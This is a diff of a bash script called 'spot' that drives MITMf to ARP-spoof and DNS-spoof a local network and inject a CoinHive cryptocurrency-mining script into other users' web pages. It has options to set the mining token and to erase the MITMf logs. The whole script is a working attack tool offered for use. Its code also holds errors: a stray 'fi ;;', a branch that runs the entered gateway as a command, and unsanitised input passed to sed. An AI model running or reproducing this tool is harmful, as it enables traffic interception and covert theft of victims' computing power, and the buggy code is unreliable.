@@ -1,111 +1,98 @@
 #!/bin/bash
 #Logo
-echo "                                                    ........                    
-                                                .;::::::::::::;'.               
-                                             .;::::::::::::::::::;.             
-               .''.                         ,:::::::::::::::::;;;::;.           
-            ;KMMWMMNo                      ;::::::ddo::::::::::::::::'          
-           .MMO.  ;kc.                    ,c:::::cWMX:::::::::::::::::'         
-            0MWd;.      00ooKNNKd.   .lOXNWN0d::0XMMWXXd:::::::::::::::         
-             ,d0WMW0l   MMMx;':0MM: ,WM0:cx0MMKcdxMMNxxl:::::::::::::::.        
-             .   .lWMK  MMx     XMX 0MW  .ccOMMd:cWMX::::::::::::::::::         
-           cWMd   .NMW  MMX.   :MMk dMMc .coNMWl:cWMNc::::::::::::::::'         
-            cXMMNWMM0'  MMXWNKWMWd   lNMWXWMMXoc::OMMWWx:::::::::::::;          
-              .,;;'     MMO ';;'       .,;:olcccccclxxxo::::::::::::,           
-                        MMO                 ;cccccccccc:::::::::cc;.            
-                        ::,                  .;ccccccccccccccccc,.              
-                                                .,:ccccccccc;'.                 
-                                                    ......                      "; echo
+if [[ -e /opt/spot/logo ]]
+then
+  cat /opt/spot/logo
+fi ;;
+
+#Program
 if [[ -d /opt/MITMf ]]
 then
-while [ -n "$1" ]
-do
-case "$1" in
+  while [ -n "$1" ]
+  do
+    case "$1" in
+      #Clear
+      -c) if [[ -e /usr/share/mitmf/logs/mitmf.log ]]
+        then
+          cd /usr/share/mitmf/logs
+	  sudo rm /usr/share/mitmf/logs/mitmf.log
+          echo; echo -e "\033[1m\e[35mLogs cleared!\033[0m"; echo
+        else
+          echo; echo -e "\033[1m\e[35mNo logs!\033[0m"; echo
+      fi ;;
+      
+      #Gateway change
+      -g) insertGateway=''
+	if [[ -e /opt/spot/gateway.txt ]]
+         then
+           echo; echo -e "\033[1m\e[35mInsert default gateway:\033[0m"
+           read insertGateway
+           while [[ -z $insertGateway ]]
+           do
+	     clear
+             echo -e "\033[1m\e[35mEmpty input. Please, insert default gateway:\033[0m"
+             read insertGateway
+           done
+           sudo sed -i -r "s/.*/$insertGateway/g" /opt/spot/gateway.txt
+           echo -e "\033[1m\e[35mGateway insert!\033[0m"; echo
+         else
+           echo -e "\033[1m\e[35mNo gateway file!\033[0m"; echo -e "\033[1m\e[35mCreating new...\033[0m"
+           echo; echo -e "\033[1m\e[35mInsert default gateway:\033[0m"
+           read insertGateway
+	   while [[ -z $insertGateway ]]
+           do
+	     clear
+             echo -e "\033[1m\e[35mEmpty input. Please, insert default gateway:\033[0m"
+             read insertGateway
+           done
+           $insertGateway > /opt/spot/gateway.txt
+           echo -e "\033[1m\e[35mGateway insert!\033[0m"
+        fi ;;
 
-#spot -c -clear
--c) if [[ -e /usr/share/mitmf/logs/mitmf.log ]]
-then
-cd /usr/share/mitmf/logs
-echo; echo -e "\033[1m\e[35mLogs cleared!\033[0m"; echo
+      #Help
+      -h) echo -e "\033[1m\e[34mspot -c\033[0m \t \033[4mc\033[0mlear MITMf logs"
+	  echo -e "\033[1m\e[34mspot -g\033[0m \t change (or insert) default \033[4mg\033[0mateway"
+	  echo -e "\033[1m\e[34mspot -h\033[0m \t show this \033[4mh\033[0melp\033[0m"
+	  echo -e "\033[1m\e[34mspot -r\033[0m \t \033[4mr\033[0mun on default gateway\033[0m"
+          echo -e "\033[1m\e[34mspot -t\033[0m \t change coinhive \033[4mt\033[0moken\033[0m"
+          echo -e "\033[1m\e[34mspot -v\033[0m \t show \033[4mv\033[0mersion" ;;
+
+      #Run
+      -r) if [[ -e /opt/spot/coinHiveMiner.js ]]
+        then
+          clear
+          gateway=`cat /opt/spot/gateway.txt`
+          if [[ -z $gateway ]]
+          then
+            echo; echo -e "\033[1m\e[35mEnter default gateway:\033[0m"
+            read gateway
+          fi
+          cd /opt/MITMf
+          sudo python mitmf.py --arp --spoof -i wlan0 --hsts --dns --gateway $gateway --inject --js-file /opt/spot/coinHiveMiner.js
+        else
+          echo; echo -e "\033[1m\e[35mNo mining script!\033[0m"; echo
+      fi ;;
+      
+      #Token change
+      -t) if [[ -e /opt/spot/coinHiveMiner.js ]]
+        then
+          token=''
+          echo; echo -e "\033[1m\e[35mInsert your CoinHive token:\033[0m"; echo
+          read token
+          sudo sed -i -r "3s/.*/var miner = new CoinHive.Anonymous('$token', {/g" /opt/spot/coinHiveMiner.js
+          echo; echo -e "\033[1m\e[35mToken changed!\033[0m"; echo
+        else
+          echo; echo -e "\033[1m\e[35mNo mining script!\033[0m"; echo
+      fi ;;
+      
+      #Version
+      -v) echo -e "\033[1m\e[35mSpot version 0.4\033[0m" ;;
+            
+      #Other
+      *) echo -e "\033[1m\e[35m$1 is not an option, use spot -h to see all commands\033[0m" ;;
+    esac
+    shift
+  done
 else
-echo; echo -e "\033[1m\e[35mNo logs!\033[0m"; echo
-fi ;;
-
-#spot -r -run
--r) if [[ -e /opt/spot/coinHiveMiner.js ]]
-then
-clear
-gateway=`cat /opt/spot/gateway.txt`
-if [[ -z $gateway ]]
-then
-echo; echo -e "\033[1m\e[35mEnter default gateway:\033[0m"
-read gateway
-fi
-cd /opt/MITMf
-sudo python mitmf.py --arp --spoof -i wlan0 --hsts --dns --gateway $gateway --inject --js-file /opt/spot/coinHiveMiner.js
-else
-echo; echo -e "\033[1m\e[35mNo mining script!\033[0m"; echo
-fi ;;
-
-#spot -m -monitor
-# -m) screen -x ;;
-
-#spot -t -token change
--t) if [[ -e /opt/spot/coinHiveMiner.js ]]
-then
-token=''
-echo; echo -e "\033[1m\e[35mInsert your CoinHive token:\033[0m"; echo
-read token
-sudo sed -i -r "3s/.*/var miner = new CoinHive.Anonymous('$token', {/g" /opt/spot/coinHiveMiner.js
-echo; echo -e "\033[1m\e[35mToken changed!\033[0m"; echo
-else
-echo; echo -e "\033[1m\e[35mNo mining script!\033[0m"; echo
-fi ;;
-
-#spot -g gateway
--g) if [[ -e /opt/spot/gateway.txt ]]
-then
-insertGateway=''
-echo; echo -e "\033[1m\e[35mInsert default gateway:\033[0m"
-read insertGateway
-while [[ -z $insertGateway ]]
-do
-echo; echo -e "\033[1m\e[35mInsert default gateway:\033[0m"
-read insertGateway
-done
-sudo sed -i -r "s/.*/$insertGateway/g" /opt/spot/gateway.txt
-echo -e "\033[1m\e[35mGateway insert!\033[0m"; echo
-else
-echo; echo -e "\033[1m\e[35mNo gateway file!\033[0m"; echo -e "\033[1m\e[35mCreating new...\033[0m"
-insertGateway=''
-echo; echo -e "\033[1m\e[35mInsert default gateway:\033[0m"
-read insertGateway
-$insertGateway > /opt/spot/gateway.txt
-echo -e "\033[1m\e[35mGateway insert!\033[0m"
-fi ;;
-
-#spot -h -help
--h) echo
-echo -e "\033[1m\e[34mspot -r\033[0m \t \033[4mRun on default gateway\033[0m"
-echo -e "\033[1m\e[34mspot -t\033[0m \t \033[4mchange coinhive Token\033[0m"
-echo -e "\033[1m\e[34mspot -g\033[0m \t \033[4mchange (or insert) default Gateway\033[0m"
-echo -e "\033[1m\e[34mspot -c\033[0m \t \033[4mClear MITMF logs\033[0m"
-echo -e "\033[1m\e[34mspot -h\033[0m \t \033[4mshow this Help\033[0m"
-echo -e "\033[1m\e[34mspot -v\033[0m \t \033[4mshow Version\033[0m"
-#echo -e "\033[1m\e[34mspot -m\033[0m \033[4mcheck server activity\033[0m"
-echo ;;
-
-#spot -v -version
--v) echo; echo -e "\033[1m\e[35mSpot version 0.2\033[0m"; echo ;;
-
---) shift; break ;;
-
-#for other
-*) echo; echo -e "\033[1m\e[35m$1 is not an option, use spot -h to see all commands\033[0m"; echo ;;
-
-esac
-shift
-done
-else
-echo; echo -e "\033[1m\e[35mFirst install MITMf (katoolin recommended)\033[0m"; echo
+  echo; echo -e "\033[1m\e[35mFirst install MITMf\033[0m"; echo
 fi
